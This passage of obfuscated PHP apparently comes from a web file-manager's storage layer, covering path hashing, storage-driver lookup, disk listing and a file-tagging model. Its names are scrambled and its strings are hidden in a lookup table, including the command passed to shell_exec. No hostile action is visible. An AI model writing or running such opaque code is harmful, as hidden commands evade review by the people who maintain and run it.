IO::info($Õì‘ÓÊŒ); $¯Äµ™™ = _get($°ÈúÂÙÔ, $ô»–¬öñ[1477], $ô»–¬öñ[12]); if (!$¯Äµ™™ && isset($°ÈúÂÙÔ[$ô»–¬öñ[557]])) { $¯Äµ™™ = $°ÈúÂÙÔ[$ô»–¬öñ[557]]; } if (!$¯Äµ™™ && isset($°ÈúÂÙÔ[$ô»–¬öñ[235]])) { $¯Äµ™™ = trim($°ÈúÂÙÔ[$ô»–¬öñ[235]], $ô»–¬öñ[118]); } if ($¯Äµ™™) { return $¯Äµ™™; } if (!$¯Äµ™™ && isset($°ÈúÂÙÔ[$ô»–¬öñ[191]]) && $°ÈúÂÙÔ[$ô»–¬öñ[191]]) { $°ÈúÂÙÔ = IO::info(KodIO::make($°ÈúÂÙÔ[$ô»–¬öñ[191]])); $¯Äµ™™ = _get($°ÈúÂÙÔ, $ô»–¬öñ[1477], $ô»–¬öñ[12]); if (!$¯Äµ™™ && isset($°ÈúÂÙÔ[$ô»–¬öñ[557]])) { $¯Äµ™™ = $°ÈúÂÙÔ[$ô»–¬öñ[557]]; } } $õÇâê·¨ = md5($°ÈúÂÙÔ[$ô»–¬öñ[87]] . $°ÈúÂÙÔ[$ô»–¬öñ[79]] . $°ÈúÂÙÔ[$ô»–¬öñ[88]]); $¬Í‘¦¶ = $õÇâê·¨ . $ô»–¬öñ[1478]; $¯Äµ™™ = $¯Äµ™™ ? $¯Äµ™™ : Cache::get($¬Í‘¦¶); if (!$¯Äµ™™ && $½¡ˆ£³ ) { $¯Äµ™™ = IO::hashSimple($°ÈúÂÙÔ[$ô»–¬öñ[87]]); Cache::set($¬Í‘¦¶, $¯Äµ™™ ? $¯Äµ™™ : $õÇâê·¨, 3600 * 24 * 30); } return $¯Äµ™™ ? $¯Äµ™™ : $õÇâê·¨; } public static function hashPathSafe($ñÂãÇæÔ, $²£µ¼¹Á = false) { $¢âı²ä’ =& $_SERVER[ïÃ°£«Ê]; $À‡óú¶÷ = self::hashPath($ñÂãÇæÔ, $²£µ¼¹Á); return md5($À‡óú¶÷ . $¢âı²ä’[1479] . Model($¢âı²ä’[874])->get($¢âı²ä’[875])); } public static function initSystemPath() { $çà„ïš­ =& $_SERVER[ïÃ°£«Ê]; if (defined($çà„ïš­[1480])) { return; } define($çà„ïš­[1480], self::systemPath($çà„ïš­[189])); define($çà„ïš­[1481], self::systemPath($çà„ïš­[1482])); define($çà„ïš­[1483], self::systemPath($çà„ïš­[1484])); define($çà„ïš­[1485], self::systemPath($çà„ïš­[1486])); IOHistory::bindEvent(); } public static function systemPath($»šïöÂ) { $Ö•‰Âêë =& $_SERVER[ïÃ°£«Ê]; $‹ØÓùÛ² = $Ö•‰Âêë[1487] . ucfirst($»šïöÂ); $Ô¯²ÛŠ = Model($Ö•‰Âêë[874])->get($‹ØÓùÛ²); if ($Ô¯²ÛŠ) { return $Ô¯²ÛŠ; } if ($»šïöÂ == $Ö•‰Âêë[189]) { $Ô¯²ÛŠ = self::make(Model($Ö•‰Âêë[934])->systemRootPathAdd($Ö•‰Âêë[628])); } else { $Ô¯²ÛŠ = self::systemPath($Ö•‰Âêë[189]); $êú¤§¬ = self::sourceID($Ô¯²ÛŠ); $Ô¯²ÛŠ = self::make(Model($Ö•‰Âêë[934])->mkdir($êú¤§¬, $»šïöÂ)); } Model($Ö•‰Âêë[874])->set($‹ØÓùÛ², $Ô¯²ÛŠ); return $Ô¯²ÛŠ; } public static function systemFolder($½Èî”‰ƒ) { $…Œ·«¸ = IO_PATH_SYSTEM_SOURCE . $½Èî”‰ƒ; $ÈÏİ£Á = Cache::get($…Œ·«¸); if (!$ÈÏİ£Á) { $ËÁ·Šœ = IO::infoFullSimple($…Œ·«¸); if (!$ËÁ·Šœ) { $ÈÏİ£Á = IO::mkdir($…Œ·«¸, REPEAT_SKIP); } else { $ÈÏİ£Á = $ËÁ·Šœ[$_SERVER[ïÃ°£«Ê][87]]; } Cache::set($…Œ·«¸, $ÈÏİ£Á, 3600 * 10); } return $ÈÏİ£Á; } public static function defaultDriver() { return Model($_SERVER[ïÃ°£«Ê][869])->defaultDriver(); } public static function defaultDriverInit() { $–àŒËî° =& $_SERVER[ïÃ°£«Ê]; static $ÃÍ¶Ëæ = false; if ($ÃÍ¶Ëæ) { return $ÃÍ¶Ëæ; } $¡°íË = self::defaultDriver(); $ÃÍ¶Ëæ = IO::init($–àŒËî°[1488] . $¡°íË[$–àŒËî°[487]] . $–àŒËî°[1476]); return $ÃÍ¶Ëæ; } public static function fileTypeList() { $á¡à‘ıÖ =& $_SERVER[ïÃ°£«Ê]; $‚äÆ¯ÊÕ = $GLOBALS[$á¡à‘ıÖ[6]][$á¡à‘ıÖ[1489]]; foreach ($‚äÆ¯ÊÕ as $–÷Õ‰ï => $ìğ™¾¦À) { $—®Ñ¨ßï = $á¡à‘ıÖ[1490] . $–÷Õ‰ï; $ô…›şé = LNG($—®Ñ¨ßï); if ($—®Ñ¨ßï != $ô…›şé) { $‚äÆ¯ÊÕ[$–÷Õ‰ï][$á¡à‘ıÖ[32]] = $ô…›şé; } } return $‚äÆ¯ÊÕ; } public static function ioFileDriverGet($ø“ô—‹¸ = '') { $»è­°è =& $_SERVER[ïÃ°£«Ê]; static $¬À±Ì´ = array(); static $ûÏÆŠ´– = array(); static $™¥²Š = array(); static $É¦³¬½¾ = false; if ($É¦³¬½¾ === !1) { $É¦³¬½¾ = array($»è­°è[598] => array(), $»è­°è[684] => array()); $“­ªóÔ = Model($»è­°è[1491])->get(!1, $»è­°è[1492]); foreach ($“­ªóÔ as $´ç„ãõã => $Ìè¾ğ¤°) { if (!$Ìè¾ğ¤° || $Ìè¾ğ¤° == $»è­°è[12]) { continue; } if (strstr($´ç„ãõã, $»è­°è[1493])) { $Ÿ•£î½Í = str_replace($»è­°è[1493], $»è­°è[12], $´ç„ãõã); $É¦³¬½¾[$»è­°è[598]][$Ÿ•£î½Í] = $Ìè¾ğ¤°; } else { if (strstr($´ç„ãõã, $»è­°è[1494])) { $Ÿ•£î½Í = str_replace($»è­°è[1494], $»è­°è[12], $´ç„ãõã); $É¦³¬½¾[$»è­°è[684]][$Ÿ•£î½Í] = $Ìè¾ğ¤°; } } } } $ñë ¯Ö‚ = self::defaultDriver(); if (!$ø“ô—‹¸ || !$É¦³¬½¾[$»è­°è[598]] && !$É¦³¬½¾[$»è­°è[684]]) { return $ñë ¯Ö‚; } $Òç¨ÑÕç = self::getPathSourceID($ø“ô—‹¸); if (!$Òç¨ÑÕç) { return $ñë ¯Ö‚; } if (isset($¬À±Ì´[$Òç¨ÑÕç])) { return $¬À±Ì´[$Òç¨ÑÕç]; } $æ—¦Ù© = Model($»è­°è[934])->sourceInfo($Òç¨ÑÕç); $½Éâ³éº = $æ—¦Ù©[$»è­°è[589]]; $å§Í¢°” = array(); if (!$æ—¦Ù©) { return $ñë ¯Ö‚; } if ($æ—¦Ù©[$»è­°è[188]] == $»è­°è[91]) { if (isset($™¥²Š[$½Éâ³éº])) { return $™¥²Š[$½Éâ³éº]; } if (isset($É¦³¬½¾[$»è­°è[684]][$½Éâ³éº])) { $¥›¸¥â† = Model($»è­°è[869])->driverInfo($É¦³¬½¾[$»è­°è[684]][$½Éâ³éº]); $ñë ¯Ö‚ = $¥›¸¥â† ? $¥›¸¥â† : $ñë ¯Ö‚; $™¥²Š[$½Éâ³éº] = $ñë ¯Ö‚; $¬À±Ì´[$Òç¨ÑÕç] = $ñë ¯Ö‚; return $ñë ¯Ö‚; } $å§Í¢°” = self::groupParentUser($½Éâ³éº); } else { if ($æ—¦Ù©[$»è­°è[188]] == $»è­°è[524]) { $ö‹Ò‡©İ = Model($»è­°è[1495])->getInfo($½Éâ³éº); if ($ö‹Ò‡©İ) { $å§Í¢°” = explode($»è­°è[50], trim($ö‹Ò‡©İ[$»è­°è[604]], $»è­°è[50])); $å§Í¢°” = array_remove_value($å§Í¢°”, $»è­°è[228]); $å§Í¢°”[] = $½Éâ³éº; $å§Í¢°” = array_reverse($å§Í¢°”); } } } foreach ($å§Í¢°” as $­®†µüÔ) { if (!isset($É¦³¬½¾[$»è­°è[598]][$­®†µüÔ])) { continue; } if (isset($ûÏÆŠ´–[$­®†µüÔ])) { return $ûÏÆŠ´–[$­®†µüÔ]; } $¥›¸¥â† = Model($»è­°è[869])->driverInfo($É¦³¬½¾[$»è­°è[598]][$­®†µüÔ]); $ñë ¯Ö‚ = $¥›¸¥â† ? $¥›¸¥â† : $ñë ¯Ö‚; $ûÏÆŠ´–[$­®†µüÔ] = $ñë ¯Ö‚; break; } if ($æ—¦Ù©[$»è­°è[188]] == $»è­°è[91]) { $™¥²Š[$½Éâ³éº] = $ñë ¯Ö‚; } $¬À±Ì´[$Òç¨ÑÕç] = $ñë ¯Ö‚; return $ñë ¯Ö‚; } private static function getPathSourceID($¾Ï€å»‚) { $æ˜¯‹˜ =& $_SERVER[ïÃ°£«Ê]; static $¸­ºñ = array(); if (!$¾Ï€å»‚) { return $æ˜¯‹˜[12]; } $Ì‡ˆË… = substr($¾Ï€å»‚, 0, strlen($æ˜¯‹˜[498])) == $æ˜¯‹˜[498]; $°øÃ¾èÛ = substr($¾Ï€å»‚, 0, strlen($æ˜¯‹˜[1462])) == $æ˜¯‹˜[1462]; $˜ˆæü…î = substr($¾Ï€å»‚, 0, strlen($æ˜¯‹˜[1463])) == $æ˜¯‹˜[1463]; if (!$Ì‡ˆË… && !$°øÃ¾èÛ && !$˜ˆæü…î) { return $æ˜¯‹˜[12]; } $°¥£ÒÀş = self::parse($¾Ï€å»‚); $¢œÜÔÂ½ = $°¥£ÒÀş[$æ˜¯‹˜[1359]]; if ($Ì‡ˆË…) { return $°¥£ÒÀş[$æ˜¯‹˜[487]]; } if (isset($¸­ºñ[$¢œÜÔÂ½])) { $¢ıµ‘¿¾ = $¸­ºñ[$¢œÜÔÂ½]; } else { $¢ıµ‘¿¾ = IO::init($¢œÜÔÂ½); $¸­ºñ[$¢œÜÔÂ½] = $¢ıµ‘¿¾; } if (isset($¢ıµ‘¿¾->pathParse[$æ˜¯‹˜[1362]])) { return $¢ıµ‘¿¾->pathParse[$æ˜¯‹˜[1362]]; } return $æ˜¯‹˜[12]; } private static function groupParentUser($ÏÉÈ˜½¼) { $½¾ŒÕµÜ =& $_SERVER[ïÃ°£«Ê]; $£°Ú‘û· = Model($½¾ŒÕµÜ[617])->getInfo($ÏÉÈ˜½¼); if (!$£°Ú‘û·) { return array(); } $„Îéï = array_to_keyvalue($£°Ú‘û·[$½¾ŒÕµÜ[1496]], $½¾ŒÕµÜ[12], $½¾ŒÕµÜ[1497]); $æ¬úË = array(); foreach ($£°Ú‘û·[$½¾ŒÕµÜ[1496]] as $ £ø»ùä) { $æ¬úË[] = $ £ø»ùä[$½¾ŒÕµÜ[1497]]; $×˜”£š = explode($½¾ŒÕµÜ[50], trim($ £ø»ùä[$½¾ŒÕµÜ[604]], $½¾ŒÕµÜ[50])); $×˜”£š = array_remove_value($×˜”£š, $½¾ŒÕµÜ[228]); $×˜”£š = array_reverse($×˜”£š); $æ¬úË = array_merge($æ¬úË, $×˜”£š); } return array_unique($æ¬úË); } public static function diskList($É‚»æŒğ = true) { $ú„Ÿ®ö = $_SERVER[ïÃ°£«Ê][1498]; if ($É‚»æŒğ) { $Ûé…ãÓƒ = Cache::get($ú„Ÿ®ö); if (is_array($Ûé…ãÓƒ)) { return $Ûé…ãÓƒ; } } $Ûé…ãÓƒ = self::diskListGet(); Cache::set($ú„Ÿ®ö, $Ûé…ãÓƒ, 60); return $Ûé…ãÓƒ; } public static function diskListGet() { $ëãûÎ†ª =& $_SERVER[ïÃ°£«Ê]; $”´ù÷„Ú = array(); if ($GLOBALS[$ëãûÎ†ª[6]][$ëãûÎ†ª[1499]] == $ëãûÎ†ª[1500]) { $Û‹ÀûÑ = $ëãûÎ†ª[1501]; for ($áâ”ÉÖí = 0; $áâ”ÉÖí < strlen($Û‹ÀûÑ); $áâ”ÉÖí++) { $ø¨û×Ñ“ = $Û‹ÀûÑ[$áâ”ÉÖí] . $ëãûÎ†ª[1502]; if (file_exists($ø¨û×Ñ“)) { $”´ù÷„Ú[] = $ø¨û×Ñ“; } } return $”´ù÷„Ú; } if (!function_exists($ëãûÎ†ª[98])) { $”´ù÷„Ú[] = $ëãûÎ†ª[993]; return $”´ù÷„Ú; } $ƒÏóêÀ = explode($ëãûÎ†ª[285], shell_exec($ëãûÎ†ª[1503])); array_shift($ƒÏóêÀ); array_pop($ƒÏóêÀ); $İŸ°¨ÕŒ = array($ëãûÎ†ª[1504], $ëãûÎ†ª[1505], $ëãûÎ†ª[1506], $ëãûÎ†ª[1507], $ëãûÎ†ª[1508], $ëãûÎ†ª[1509], $ëãûÎ†ª[1510], $ëãûÎ†ª[1511]); foreach ($ƒÏóêÀ as $ÒªÊ¦–á) { $°ãíµ¿· = preg_split($ëãûÎ†ª[1512], $ÒªÊ¦–á); $ø¨û×Ñ“ = $°ãíµ¿·[count($°ãíµ¿·) - 1]; if (!strstr($°ãíµ¿·[0], $ëãûÎ†ª[1513]) || !$ø¨û×Ñ“) { continue; } $ßçÂÁá™ = rtrim($ø¨û×Ñ“, $ëãûÎ†ª[8]) . $ëãûÎ†ª[8]; $”´ù÷„Ú[] = $ßçÂÁá™; } return $”´ù÷„Ú; } public static function isSameDisk($ƒÈœ…Ï», $£¹åêœ¶) { $ÚÖİŒØØ =& $_SERVER[ïÃ°£«Ê]; if ($GLOBALS[$ÚÖİŒØØ[6]][$ÚÖİŒØØ[1499]] == $ÚÖİŒØØ[1500]) { return strtolower(substr($ƒÈœ…Ï», 0, 1)) == strtolower(substr($£¹åêœ¶, 0, 1)); } $„…ÅŒ¢ï = stat($ƒÈœ…Ï»); $¨Ó¢£İö = stat($£¹åêœ¶); if ($„…ÅŒ¢ï === !1 || $¨Ó¢£İö === !1) { return !1; } return $„…ÅŒ¢ï[$ÚÖİŒØØ[1514]] === $¨Ó¢£İö[$ÚÖİŒØØ[1514]]; $åµÊÖíŸ = self::diskList(); $ò—æÔÈà = !1; $ğ’èËêè = !1; sort($åµÊÖíŸ); $åµÊÖíŸ = array_reverse($åµÊÖíŸ); $ƒÈœ…Ï» = rtrim($ƒÈœ…Ï», $ÚÖİŒØØ[8]) . $ÚÖİŒØØ[8]; $£¹åêœ¶ = rtrim($£¹åêœ¶, $ÚÖİŒØØ[8]) . $ÚÖİŒØØ[8]; foreach ($åµÊÖíŸ as $éÛû—¾) { $ ÊŠ×”İ = strlen($éÛû—¾); if (!$ò—æÔÈà && substr($ƒÈœ…Ï», 0, $ ÊŠ×”İ) == $éÛû—¾) { $ò—æÔÈà = $éÛû—¾; } if (!$ğ’èËêè && substr($£¹åêœ¶, 0, $ ÊŠ×”İ) == $éÛû—¾) { $ğ’èËêè = $éÛû—¾; } if ($ò—æÔÈà && $ğ’èËêè) { break; } } return $ò—æÔÈà === $ğ’èËêè; } public static function transferType($¸Ö˜Ğª, $¼‰Ë¾¦‹) { $´ ëüÚš =& $_SERVER[ïÃ°£«Ê]; $ÊÄì°÷ = self::driverType($¸Ö˜Ğª); $øÈš¿õÙ = self::driverType($¼‰Ë¾¦‹); if ($ÊÄì°÷[$´ ëüÚš[33]] == $øÈš¿õÙ[$´ ëüÚš[33]] && $ÊÄì°÷[$´ ëüÚš[1515]] == $øÈš¿õÙ[$´ ëüÚš[1515]]) { return $´ ëüÚš[1516]; } if ($ÊÄì°÷[$´ ëüÚš[33]] == $´ ëüÚš[1027] && $øÈš¿õÙ[$´ ëüÚš[33]] == $´ ëüÚš[106]) { return $´ ëüÚš[1387]; } if ($ÊÄì°÷[$´ ëüÚš[33]] == $´ ëüÚš[106] && $øÈš¿õÙ[$´ ëüÚš[33]] == $´ ëüÚš[1027]) { return $´ ëüÚš[107]; } return $´ ëüÚš[1517]; } public static function driverType($À›ŠóÃ) { $ñÀ¸’ =& $_SERVER[ïÃ°£«Ê]; $ğœ÷”İ = str_replace($ñÀ¸’[1518], $ñÀ¸’[12], strtolower($À›ŠóÃ->getType())); if ($ğœ÷”İ == $ñÀ¸’[859] || $ğœ÷”İ == $ñÀ¸’[1519] || $ğœ÷”İ == $ñÀ¸’[1520]) { $¶±¹×®‡ = self::ioFileDriverGet($ñÀ¸’[498] . $À›ŠóÃ->pathParse[$ñÀ¸’[1362]] . $ñÀ¸’[402]); $À›ŠóÃ = IO::init($ñÀ¸’[1488] . $¶±¹×®‡[$ñÀ¸’[487]] . $ñÀ¸’[1476]); } else { if ($ğœ÷”İ == $ñÀ¸’[1396] || $ğœ÷”İ == $ñÀ¸’[1521]) { $À›ŠóÃ = IO::init($À›ŠóÃ->pathParse[$ñÀ¸’[1339]]); } } $ó˜Ã†áÇ = $À›ŠóÃ->path; $ğœ÷”İ = str_replace($ñÀ¸’[1518], $ñÀ¸’[12], strtolower($À›ŠóÃ->getType())); if ($ğœ÷”İ == $ñÀ¸’[106]) { return array($ñÀ¸’[33] => $ñÀ¸’[106], $ñÀ¸’[1515] => $ñÀ¸’[12], $ñÀ¸’[87] => $ó˜Ã†áÇ, $ñÀ¸’[96] => $À›ŠóÃ); } return array($ñÀ¸’[33] => $ñÀ¸’[1027], $ñÀ¸’[1515] => $À›ŠóÃ->pathDriver, $ñÀ¸’[87] => $ó˜Ã†áÇ, $ñÀ¸’[96] => $À›ŠóÃ); } public static function pathDriverType($â“”¹­ó) { return $â“”¹­ó ? self::driverType(IO::init($â“”¹­ó)) : !1; } public static function pathDriverLocal($ù¿æáçö) { $Æå¤„¢‚ =& $_SERVER[ïÃ°£«Ê]; $çöâÖÕ„ = $ù¿æáçö ? self::driverType(IO::init($ù¿æáçö)) : !1; return strtolower($çöâÖÕ„[$Æå¤„¢‚[33]]) == $Æå¤„¢‚[106] ? !0 : !1; } public static function allowCover($—…Æ„óÈ, $É÷¢Úû = true) { $›ŠÎçší =& $_SERVER[ïÃ°£«Ê]; if (is_string($—…Æ„óÈ)) { $—…Æ„óÈ = IO::info($—…Æ„óÈ); } if (!$—…Æ„óÈ || $—…Æ„óÈ[$›ŠÎçší[33]] == $›ŠÎçší[78] || $—…Æ„óÈ[$›ŠÎçší[79]] <= 100) { return !1; } if (isset($—…Æ„óÈ[$›ŠÎçší[1522]]) || !$—…Æ„óÈ[$›ŠÎçší[87]]) { return !1; } if (isset($—…Æ„óÈ[$›ŠÎçší[232]]) && !$—…Æ„óÈ[$›ŠÎçší[232]]) { return !1; } static $µìƒ¤±™ = false; if (!$µìƒ¤±™ || !$É÷¢Úû) { $¦—•²È® = self::driverType(IO::init($—…Æ„óÈ[$›ŠÎçší[87]])); $ìª±Ÿ¦® = $¦—•²È®[$›ŠÎçší[96]]; $µìƒ¤±™ = $›ŠÎçší[194]; if ($¦—•²È®[$›ŠÎçší[33]] == $›ŠÎçší[106]) { $µìƒ¤±™ = $›ŠÎçší[1523]; } if ($¦—•²È®[$›ŠÎçší[96]] && is_array($¦—•²È®[$›ŠÎçší[96]]->config)) { $şÑî“·Ê = $¦—•²È®[$›ŠÎçší[96]]->config; if (isset($şÑî“·Ê[$›ŠÎçší[1524]]) && $şÑî“·Ê[$›ŠÎçší[1524]]) { $µìƒ¤±™ = $›ŠÎçší[1523]; } } $ã›ã“å = KodIO::defaultDriver(); if (strtolower($ã›ã“å[$›ŠÎçší[96]]) == $›ŠÎçší[106] && is_array($ã›ã“å[$›ŠÎçší[6]])) { $ÓëË©˜ = $ã›ã“å[$›ŠÎçší[6]][$›ŠÎçší[1371]]; if (substr($ÓëË©˜, 0, 2) == $›ŠÎçší[1525]) { $ÓëË©˜ = str_replace($›ŠÎçší[1525], BASIC_PATH, $ÓëË©˜); } $ÓëË©˜ = str_replace($›ŠÎçší[254], $›ŠÎçší[8], $ÓëË©˜); if (substr($—…Æ„óÈ[$›ŠÎçší[87]], 0, strlen($ÓëË©˜)) == $ÓëË©˜) { $µìƒ¤±™ = $›ŠÎçší[194]; } } } return $µìƒ¤±™ == $›ŠÎçší[1523] ? !0 : !1; } } goto cÊàšá¤å›; c“Ğ§¥Éš: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($ŒÓ­Şú) { $èú•ú¢– =& $_SERVER[ïÃ°£«Ê]; return array($èú•ú¢–[2299] => array($èú•ú¢–[2724] . USER_ID, $èú•ú¢–[2300])); } protected function ___listData() { $¡ì«áÚ« =& $_SERVER[ïÃ°£«Ê]; $ÊÓÛàÃ = array($¡ì«áÚ«[1971] => USER_ID, $¡ì«áÚ«[573] => array($¡ì«áÚ«[2303], 0)); $şá³Üù  = $¡ì«áÚ«[2725]; $ŒëñÁ‘ = $this->field($şá³Üù )->where($ÊÓÛàÃ)->order($¡ì«áÚ«[2305])->select(); return $ŒëñÁ‘ ? $ŒëñÁ‘ : array(); } protected function addToTag($ä‡ÈÆ–“, $·°€äé¬) { $Ä¢ãñÃ½ =& $_SERVER[ïÃ°£«Ê]; if (!Model($Ä¢ãñÃ½[2454])->listData($·°€äé¬)) { return !1; } if (is_numeric($ä‡ÈÆ–“)) { $êÂõØšÅ = Model($Ä¢ãñÃ½[934])->pathInfo($ä‡ÈÆ–“); if (!$êÂõØšÅ) { return !1; } } else { $êÂõØšÅ = IO::infoSimple($ä‡ÈÆ–“); if (!$êÂõØšÅ) { return !1; } $—˜Ã÷«Á = $êÂõØšÅ[$Ä¢ãñÃ½[32]]; $ÆÊ²âÚ = $êÂõØšÅ[$Ä¢ãñÃ½[33]]; if (isset($êÂõØšÅ[$Ä¢ãñÃ½[500]])) { $ÆÊ²âÚ = $êÂõØšÅ[$Ä¢ãñÃ½[500]] == $Ä¢ãñÃ½[91] ? $Ä¢ãñÃ½[78] : $Ä¢ãñÃ½[230]; } } $‘ê¡Úê„ = array($Ä¢ãñÃ½[1971] => USER_ID, $Ä¢ãñÃ½[573] => $·°€äé¬, $Ä¢ãñÃ½[510] => $ä‡ÈÆ–“, $Ä¢ãñÃ½[511] => $ÆÊ²âÚ ? $ÆÊ²âÚ : $Ä¢ãñÃ½[505], $Ä¢ãñÃ½[509] => $—˜Ã÷«Á ? $—˜Ã÷«Á : $Ä¢ãñÃ½[12], $Ä¢ãñÃ½[2189] => 0); if ($this->where($‘ê¡Úê„)->find()) { return !1; } return $this->add($‘ê¡Úê„); } protected function removeFromTag($ÜåÑ¤‰’, $ßû™æòê) { $¤ÓÆîğ” =& $_SERVER[ïÃ°£«Ê]; if (!Model($¤ÓÆîğ”[2454])->listData($ßû™æòê)) { return !1; } if (is_array($ÜåÑ¤‰’)) { $ÜåÑ¤‰’ = array($¤ÓÆîğ”[7], $ÜåÑ¤‰’); } $­¯çÛÀ = array($¤ÓÆîğ”[1971] => USER_ID, $¤ÓÆîğ”[573] => $ßû™æòê, $¤ÓÆîğ”[510] => $ÜåÑ¤‰’); return $this->where($­¯çÛÀ)->delete(); } protected function removeByTag($»“àç§å) { $óß¼åç“ =& $_SERVER[ïÃ°£«Ê]; if (!$»“àç§å) { return !1; } $œ²Á²ôÜ = array($óß¼åç“[1971] => USER_ID, $óß¼åç“[573] => $»“àç§å); return $this->where($œ²Á²ôÜ)->delete(); } protected function removeBySource($¡Öò) { $ÉóÇÙ–Ü =& $_SERVER[ïÃ°£«Ê]; if (is_array($¡Öò)) { $¡Öò = array($ÉóÇÙ–Ü[7], $¡Öò); } $÷“Ê€² = array($ÉóÇÙ–Ü[1971] => USER_ID, $ÉóÇÙ–Ü[573] => array($ÉóÇÙ–Ü[1182], 0), $ÉóÇÙ–Ü[510] => $¡Öò); return $this->where($÷“Ê€²)->delete(); } }